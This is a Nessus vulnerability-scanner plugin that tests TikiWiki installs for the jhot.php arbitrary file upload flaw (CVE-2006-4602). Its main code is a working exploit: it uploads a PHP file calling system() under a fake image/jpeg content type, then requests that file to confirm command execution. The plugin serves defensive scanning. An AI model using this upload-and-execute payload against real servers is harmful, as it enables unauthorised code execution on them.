#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(22303);
  script_version("$Revision: 1.22 $");

  script_cve_id("CVE-2006-4602");
  script_bugtraq_id(19819);
  script_osvdb_id(28456);
  script_xref(name:"EDB-ID", value:"2288");

  script_name(english:"TikiWiki jhot.php Arbitrary File Upload");
  script_summary(english:"Tries to run a command through TikiWiki");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that allows uploading of
arbitrary files." );
 script_set_attribute(attribute:"description", value:
"The 'jhot.php' script included with the version of TikiWiki installed
on the remote host allows an unauthenticated attacker to upload
arbitrary files to a known directory within the web server's document
root.  Provided PHP's 'file_uploads' setting is enabled, which is true
by default, this flaw can be exploited to execute arbitrary code on
the affected host, subject to the privileges of the web server user
id." );
 script_set_attribute(attribute:"see_also", value:"http://tikiwiki.org/tiki-index.php?page=ReleaseProcess195&bl" );
 script_set_attribute(attribute:"solution", value:
"Either remove the affected 'jhot.php' script or upgrade to TikiWiki
1.9.5 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
 script_set_attribute(attribute:"metasploit_name", value:'TikiWiki jhot Remote Command Execution');
 script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/09/04");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/09/04");
 script_cvs_date("$Date: 2015/09/24 23:21:21 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:tikiwiki:tikiwiki");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "no404.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0, php: 0);
if (get_kb_item("www/no404/" + port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/tiki", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Make sure the affected script exists.
  url = strcat(dir, "/jhot.php");
  w = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail: 1);

  # If it does...
  #
  # nb: the script doesn't respond when called directly.
  if (w[0] =~ "^HTTP/.* 200 OK")
  {
    # Try to exploit the flaw to execute a command.
    cmd = "id";
    fname = strcat(SCRIPT_NAME, "-", unixtime(), ".php");
    bound = "bound";
    boundary = strcat("--", bound);
    postdata = strcat(
      boundary, '\r\n', 
      'Content-Disposition: form-data; name="filepath"; filename="', fname, '";\r\n',
      'Content-Type: image/jpeg;\r\n',
      '\r\n',
      '<?php\r\n',
      'system(', cmd, '); \r\n',
      '?>\r\n',
      '\r\n',

      boundary, '--\r\n'
    );
    w = http_send_recv3(method:"POST", item: url, port: port, 
      content_type: "multipart/form-data; boundary="+bound,
      data: postdata, exit_on_fail: 1);
    
    # Now call the file we just uploaded.
    w = http_send_recv3(method:"GET", item: strcat(dir, "/img/wiki/", fname), port:port, exit_on_fail: 1);
    res = w[2];

    line = egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res);
    if (line)
    {
      if (report_verbosity < 1) security_hole(port);
      else 
      {
        report = strcat(
          '\n',
          'Nessus was able to execute the command \'id\' on the remote host,\n',
          'which produced the following output :\n',
          '\n',
          line
        );
        security_hole(port:port, extra:report);
      }
      exit(0);
    }
  }
}
